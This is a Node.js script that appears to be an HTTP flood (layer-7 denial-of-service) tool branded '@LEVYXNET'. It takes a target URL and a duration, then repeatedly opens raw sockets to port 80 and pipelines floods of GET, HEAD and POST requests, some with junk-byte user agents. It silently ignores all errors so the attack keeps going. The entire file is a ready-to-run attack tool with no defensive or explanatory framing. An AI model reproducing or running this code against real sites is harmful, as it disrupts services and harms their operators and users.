const fs = require('fs');
const url = require('url');
const net = require('net');
if (process.argv.length <= 2) {
	console.log("L7-DSTAT   |   @LEVYXNET");
	console.log("node spike.js [URL] [Time]");
	console.log("node spike.js http://dstatIP 15");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

const userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36'
];

const nullHexs = [
"\x00", 
"\xFF", 
"\xC2", 
"\xA0",
"\x62",
"\x61",
"\x6D",
"\x7D",
"\x68",
"\x7B",
"\x06",
"\x8F",
"\x67",
"\x7F",
"\x14",
"\x1E",
"\x1F",
"\x1E",
"\x1C",
"\x18",
"\x15",
"\x15",
"\x15",
"\x1E",
"\x15",
"\x18",
"\x15",
"\x48",
"\x47",
"\x46",
"\x5A",
"\x44",
"\x46",
"\x48",
"\x43",
"\x5A",
"\x47",
"\x5F",
"\x5B",
"\x46",
"\x4F",
"\x48",
"\x5B",
"\x5A",
"\x4E",
"\x4F",
"\x5B",
"\x5A",
"\x4D",
"\x5B",
"\x5A",
"\x5B",
"\x5A"
];

var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(120000);
    for (var i = 0; i < 120; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);

process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});
